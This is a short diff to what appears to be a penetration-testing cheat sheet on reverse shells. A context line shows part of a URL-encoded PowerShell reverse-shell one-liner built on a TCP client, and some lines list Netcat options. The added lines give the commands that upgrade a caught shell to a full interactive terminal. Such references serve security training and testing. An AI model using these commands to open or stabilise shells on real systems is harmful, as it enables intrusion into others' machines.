@@ -43,3 +43,13 @@ powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient
 | -w <seconds> | Specifies the timeout value for connections. |
 | -v | Starts Netcat in verbose mode. |
 | -vv | Starts Netcat in very verbose mode. |
+
+### Bash TTY
+```
+SHELL=/bin/bash script -q /dev/null
+Ctrl-Z
+stty raw -echo
+fg
+reset
+xterm
+```
